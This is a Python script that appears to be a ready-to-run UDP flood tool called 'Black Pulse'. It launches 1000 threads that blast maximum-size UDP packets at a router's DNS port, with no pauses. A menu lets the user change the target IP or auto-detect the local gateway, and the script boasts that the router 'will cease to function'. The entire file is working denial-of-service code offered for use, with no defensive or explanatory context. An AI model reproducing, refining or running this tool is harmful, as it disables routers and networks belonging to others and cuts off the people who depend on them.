# blackpulse.py - NETVANTIS v3.0 "Black Pulse"
# MAXIMUM UDP SATURATION - NO MERCY

import socket
import threading
import time
import os
import random
import sys

# COLORS
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'

# CONFIG
TARGET = "192.168.1.1"
ATTACK_PORT = 53  # DNS — most overloaded service
PACKET_SIZE = 1472  # MAX UDP before IP frag
DURATION = 0  # 0 = infinite
THREAD_COUNT = 1000  # Yes. 1000.
PACKETS_PER_THREAD = 1000000  # Each thread spams hard

# Global
running = False
total_packets = 0
lock = threading.Lock()

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def banner():
    clear()
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════╗
║    ███╗   ██╗██╗████████╗ █████╗ ████████╗  ║
║    ████╗  ██║██║╚══██╔══╝██╔══██╗╚══██╔══╝  ║
║    ██╔██╗ ██║██║   ██║   ███████║   ██║     ║
║    ██║╚██╗██║██║   ██║   ██╔══██║   ██║     ║
║    ██║ ╚████║██║   ██║   ██║  ██║   ██║     ║
║    ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝     ║
║       {YELLOW}BLACK PULSE INITIATED{RESET}              ║
║       {CYAN}NAT COLLAPSE • DNS OVERLOAD{RESET}        ║
╚══════════════════════════════════════════╝{RESET}
    """.strip())
    print(f"{GREEN}[✓]{RESET} Target: {YELLOW}{TARGET}{RESET}")
    print(f"{GREEN}[✓]{RESET} Port: {RED}{ATTACK_PORT}{RESET} (DNS Forwarder)")
    print(f"{GREEN}[✓]{RESET} Threads: {YELLOW}{THREAD_COUNT}{RESET}")
    print(f"{CYAN}[!]{RESET} Press {RED}CTRL+C{RESET} to stop\n")

def get_gateway():
    try:
        result = os.popen("ip route | grep default").read()
        if result:
            return result.split()[2]
    except:
        pass
    return "192.168.1.1"

def flood(target_ip, port, packets):
    global running, total_packets
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Optional: bind to random local port
        sock.bind(("", random.randint(10000, 65535)))
    except:
        return

    sent = 0
    payload = os.urandom(PACKET_SIZE)  # Max UDP

    while running and sent < packets:
        try:
            sock.sendto(payload, (target_ip, port))
            with lock:
                total_packets += 1
            sent += 1
            # No sleep — MAX FIRE
        except:
            break
    if sock:
        sock.close()

def stats():
    start = time.time()
    last_packets = 0
    while running:
        time.sleep(1)
        current = total_packets
        diff = current - last_packets
        last_packets = current
        elapsed = time.time() - start
        pps = int(current / elapsed) if elapsed > 0 else 0
        sys.stdout.write(f"\r{RED}[⚡]{RESET} {CYAN}Packets: {YELLOW}{current:,}{RESET} | {RED}Speed: {pps:,} pps{RESET} | {GREEN}Target: {TARGET}{RESET}    ")
        sys.stdout.flush()

def start_attack():
    global running, total_packets
    running = True
    total_packets = 0

    banner()
    print(f"{YELLOW}[→]{RESET} Launching {RED}BLACK PULSE{RESET} on {TARGET}:{ATTACK_PORT}")
    print(f"{CYAN}[→]{RESET} Flooding DNS forwarder with {YELLOW}{PACKET_SIZE}B{RESET} UDP")
    print(f"{RED}[⚡]{RESET} Maximum saturation — router will **cease to function**\n")

    # Start stats
    threading.Thread(target=stats, daemon=True).start()

    # Create threads
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=flood, args=(TARGET, ATTACK_PORT, PACKETS_PER_THREAD))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        print(f"\n\n{RED}[✘]{RESET} Attack stopped.\n")

def change_target():
    global TARGET
    print(f"\n{CYAN}Current: {YELLOW}{TARGET}{RESET}")
    new = input(f"{CYAN}New IP: {RESET}").strip()
    if new and is_valid_ip(new):
        TARGET = new
        print(f"{GREEN}[✓]{RESET} Target updated.")
    else:
        print(f"{RED}[✘]{RESET} Invalid IP.")
    time.sleep(1.5)

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

def menu():
    while True:
        banner()
        print(f" {GREEN}[1]{RESET} Start BLACK PULSE Attack")
        print(f" {CYAN}[2]{RESET} Change Target IP")
        print(f" {CYAN}[3]{RESET} Auto-Detect Gateway")
        print(f" {RED}[0]{RESET} Exit\n")
        choice = input(f"{YELLOW}blackpulse > {RESET}").strip()

        if choice == '1':
            start_attack()
        elif choice == '2':
            change_target()
        elif choice == '3':
            gw = get_gateway()
            print(f"\n{GREEN}[✓]{RESET} Detected: {YELLOW}{gw}{RESET}")
            time.sleep(1.5)
        elif choice == '0':
            print(f"\n{GREEN}[✓]{RESET} Exit.\n")
            sys.exit()
        else:
            print(f"\n{RED}[✘]{RESET} Invalid.\n")
            time.sleep(1.5)

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        running = False
        print(f"\n{RED}[✘]{RESET} Exit.\n")
